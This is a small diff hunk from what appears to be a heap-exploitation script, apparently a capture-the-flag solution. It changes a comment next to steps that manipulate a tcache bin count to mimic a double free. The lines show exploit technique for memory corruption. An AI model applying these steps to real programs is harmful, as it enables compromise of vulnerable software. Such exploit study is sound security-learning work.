@@ -178,7 +178,7 @@ if __name__ == "__main__":
     # pop last cake from tcache bin in cake 1, decrements ncached to 3
     create_cake_classic(0x8)
 
-    # set ncached back to 4
+    # set ncached back to 4, probably not needed for this but this allows us to mimic a double free
     selfie_overwrite_tcache(4)
 
     # pop last cake again into cake 2
